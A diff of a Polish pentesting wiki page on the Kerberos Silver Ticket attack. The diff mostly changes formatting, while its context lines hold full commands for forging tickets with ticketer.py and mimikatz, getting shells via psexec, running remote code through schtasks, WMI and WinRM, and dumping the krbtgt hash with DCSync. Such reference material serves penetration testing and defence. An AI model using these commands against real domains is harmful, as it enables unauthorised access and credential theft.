@@ -1,4 +1,4 @@
-# Bilet srebrny
+# Silver Ticket
 
 <details>
 
@@ -27,12 +27,15 @@ Atak **Bilet srebrny** polega na wykorzystaniu biletów usług w środowiskach A
 Do tworzenia biletów używane są różne narzędzia w zależności od systemu operacyjnego:
 
 ### Na Linuxie
+
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
+
 ### Na Windows
+
 ```bash
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
@@ -44,18 +47,19 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
+
 ## Dostępne Usługi
 
-| Rodzaj Usługi                              | Bilety Silver dla Usługi                                                |
-| ------------------------------------------ | ----------------------------------------------------------------------- |
-| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>W zależności od systemu operacyjnego także:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>W niektórych przypadkach można po prostu poprosić o: WINRM</p> |
-| Zadania Zaplanowane                        | HOST                                                                   |
-| Windows File Share, również psexec          | CIFS                                                                   |
-| Operacje LDAP, w tym DCSync                | LDAP                                                                   |
-| Narzędzia Administracji Zdalnej Serwera Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                     |
-| Golden Tickets                             | krbtgt                                                                 |
+| Rodzaj Usługi                                   | Bilety Silver dla Usługi                                                                         |
+| ----------------------------------------------- | ------------------------------------------------------------------------------------------------ |
+| WMI                                             | <p>HOST</p><p>RPCSS</p>                                                                          |
+| PowerShell Remoting                             | <p>HOST</p><p>HTTP</p><p>W zależności od systemu operacyjnego także:</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                           | <p>HOST</p><p>HTTP</p><p>W niektórych przypadkach można po prostu poprosić o: WINRM</p>          |
+| Zadania Zaplanowane                             | HOST                                                                                             |
+| Windows File Share, również psexec              | CIFS                                                                                             |
+| Operacje LDAP, w tym DCSync                     | LDAP                                                                                             |
+| Narzędzia Administracji Zdalnej Serwera Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                                               |
+| Golden Tickets                                  | krbtgt                                                                                           |
 
 Za pomocą **Rubeus** możesz **poprosić o wszystkie** te bilety, używając parametru:
 
@@ -74,14 +78,17 @@ W poniższych przykładach załóżmy, że bilet został pozyskany poprzez podsz
 ### CIFS
 
 Dzięki temu biletowi będziesz mógł uzyskać dostęp do folderów `C$` i `ADMIN$` za pomocą **SMB** (jeśli są one dostępne) i skopiować pliki do części systemu plików zdalnego wykonując coś w rodzaju:
+
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
+
 ### HOST
 
 Z tym uprawnieniem możesz generować zaplanowane zadania na zdalnych komputerach i wykonywać dowolne polecenia:
+
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -93,9 +100,11 @@ schtasks /query /S some.vuln.pc
 #Run created schtask now
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
+
 ### HOST + RPCSS
 
 Z tymi biletami możesz **wykonać WMI w systemie ofiary**:
+
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -105,22 +114,25 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
+
 Znajdź **więcej informacji o wmiexec** na następnej stronie:
 
-{% content-ref url="../ntlm/wmicexec.md" %}
-[wmicexec.md](../ntlm/wmicexec.md)
+{% content-ref url="../lateral-movement/wmicexec.md" %}
+[wmicexec.md](../lateral-movement/wmicexec.md)
 {% endcontent-ref %}
 
 ### HOST + WSMAN (WINRM)
 
 Z dostępem winrm do komputera możesz **uzyskać do niego dostęp** i nawet uruchomić PowerShell:
+
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
+
 Sprawdź następną stronę, aby dowiedzieć się **więcej sposobów łączenia się z hostem zdalnym za pomocą winrm**:
 
-{% content-ref url="../ntlm/winrm.md" %}
-[winrm.md](../ntlm/winrm.md)
+{% content-ref url="../lateral-movement/winrm.md" %}
+[winrm.md](../lateral-movement/winrm.md)
 {% endcontent-ref %}
 
 {% hint style="warning" %}
@@ -130,9 +142,11 @@ Zauważ, że **winrm musi być aktywny i nasłuchiwać** na zdalnym komputerze, 
 ### LDAP
 
 Z tym uprawnieniem możesz wykonać zrzut bazy danych DC za pomocą **DCSync**:
+
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
+
 **Dowiedz się więcej o DCSync** na następnej stronie:
 
 ## Referencje
